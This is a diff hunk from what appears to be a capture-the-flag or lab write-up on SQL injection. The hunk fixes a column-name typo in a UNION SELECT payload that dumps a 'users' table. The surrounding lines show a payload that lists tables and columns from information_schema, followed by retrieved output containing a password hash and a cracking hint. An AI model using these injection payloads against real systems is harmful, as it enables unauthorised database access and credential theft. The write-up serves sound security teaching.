@@ -11,7 +11,7 @@ We can now try to search for a list of tables and columns in the database with t
 `1 UNION SELECT table_name, column_name FROM information_schema.COLUMNS`.
 We can then observe a definition of a table named `users` wich contains column like
 `Commentaire` and `countersign`. If we query those two values with 
-`1 UNION SELECT Commentaire, contersign FROM users` we can get the values
+`1 UNION SELECT Commentaire, countersign FROM users` we can get the values
 ```
 First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
 Surname : 5ff9d0165b4f92b14994e5c685cdce28
